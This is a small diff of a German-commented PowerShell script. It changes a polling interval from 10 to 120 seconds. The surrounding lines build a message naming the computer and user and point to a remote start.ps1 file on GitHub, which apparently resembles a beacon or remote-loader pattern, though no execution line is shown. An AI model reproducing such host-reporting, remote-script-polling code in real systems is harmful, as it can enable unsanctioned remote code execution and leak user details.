@@ -16,7 +16,7 @@ $message = @{
     "content" = "Script wurde auf $computerName mit dem User $username gestartet"
 }
 # Intervall für die Überprüfung in Sekunden (z.B. alle 5 Minuten)
-$checkInterval = 10
+$checkInterval = 120
 #Url zu den Github Dateien
 $url = "https://raw.githubusercontent.com/Samuitl/New-Test/main/start.ps1"
 
